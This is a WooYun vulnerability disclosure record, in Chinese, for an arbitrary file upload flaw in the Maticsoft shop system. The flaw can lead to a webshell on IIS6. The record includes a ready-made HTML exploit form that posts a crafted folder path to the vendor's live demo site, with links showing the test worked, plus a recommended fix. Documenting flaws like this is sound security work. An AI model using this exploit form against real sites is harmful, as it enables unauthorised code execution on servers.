{"id": 55803, "wybug_id": "wooyun-2014-059880", "wybug_title": "动软商城系统任意文件上传可能导致GetShell", "wybug_corp": "动软商城", "wybug_author": "路人甲", "wybug_date": "2014-05-08 11:58", "wybug_open_date": "2014-08-06 12:00", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-08-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  动软商城系统2.0源码下载：http://pan.baidu.com/share/link?shareid=1831333754&uk=2099536883动软商城系统未正确过滤文件上传路径，保存文件路径参数未正确过滤并且可自定义，导致可以创建类似a.asp这样的文件，可以利用IIS解析漏洞成功getshell.相关页面：/Ajax_Handle/UploadAttachmentHandler.ashx/Ajax_Handle/UploadLocalVideoHandler.ashx..调用类时验证参数path未正确过滤，导致可以创建任意文件名文件：\n//目录验证            if (!Directory.Exists(uploadpath))            {                Directory.CreateDirectory(uploadpath);            }\n漏洞利用EXP：\n<FORM name=form1 method=post action=\"http://shop1.maticsoft.cn/Ajax_Handle/UploadAttachmentHandler.ashx\" enctype=multipart/form-data>save：<input type=\"text\" name=\"folder\" value=\"./a.asp\" size=\"30\"><br>submit：<input type=\"file\" name=\"Filedata\" size=\"30\"><INPUT type=submit value=上传 name=Submit>\n官网演示站点测试成功：http://shop1.maticsoft.cn/Ajax_Handle/a.asp/d85ca259-cf8a-418b-8e23-31e5fe750ea8.jpghttp://shop2.maticsoft.cn/Ajax_Handle/a.asp/70441256-7ff6-40a3-8f3b-2d34ce7f04e5.jpg\n\n官网测试站点为II7故无此解析漏洞，但但a.asp文件夹仍创建了，若采用ii6，则可以getshell成功。   漏洞证明：  如上   修复方案：  正确过滤保存路径参数，或不允许不存在时创建。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}